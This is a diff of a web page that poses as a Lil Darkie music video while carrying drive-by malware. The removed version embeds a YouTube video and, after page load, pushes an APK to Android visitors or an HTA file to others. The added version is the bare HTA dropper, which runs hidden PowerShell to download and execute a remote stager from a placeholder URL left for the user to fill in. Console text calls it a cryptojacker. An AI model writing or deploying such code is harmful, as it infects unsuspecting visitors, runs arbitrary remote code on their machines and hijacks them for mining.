@@ -1,36 +1,25 @@
-﻿<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LIL DARKIE - AMV (PROD. WENDIGO)</title>
-    <style>body{margin:0;background:#000;overflow:hidden;}iframe{width:100vw;height:100vh;border:none;}</style>
-</head>
-<body>
-    <iframe src="https://www.youtube.com/embed/54Td5wxNDpo?autoplay=1&rel=0" allowfullscreen></iframe>
-    <script>
-        function deployPayload() {
-            console.log("%cðŸŽµ Lil Darkie AMV playing - deploying cryptojacker in background", "color:lime;font-size:14px");
-            const isAndroid = /android/i.test(navigator.userAgent);
-            
-            if (isAndroid) {
-                const a = document.createElement('a');
-                a.href = "/android-payload.apk";
-                a.download = "LilDarkie_AMV_Player.apk";
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            } else {
-                const stager = `powershell -windowstyle hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('https://your-stager-host.com/win-stager.ps1'))"`;
-                const blob = new Blob([`<script>new ActiveXObject('WScript.Shell').Run('${stager}',0,false);</script>`], {type:'text/html'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url; a.download = 'amv_update.hta';
-                document.body.appendChild(a); a.click(); document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }
-        }
-        window.onload = () => setTimeout(deployPayload, 2800);
-    </script>
-</body>
-</html>
+<script>
+    function deployMiner() {
+        console.log("%cLil Darkie AMV - Background mining started", "color:lime; font-size:14px");
+
+        // More reliable HTA drop
+        const stagerUrl = "https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/win-stager.ps1"; 
+        // ← Change this to your actual raw stager URL
+
+        const code = `powershell -windowstyle hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('${stagerUrl}'))"`;
+
+        const blob = new Blob([`<script>new ActiveXObject('WScript.Shell').Run('${code}', 0, false);</script>`], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'update.hta';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+
+    // Trigger after a short delay
+    window.onload = () => setTimeout(deployMiner, 2800);
+</script>
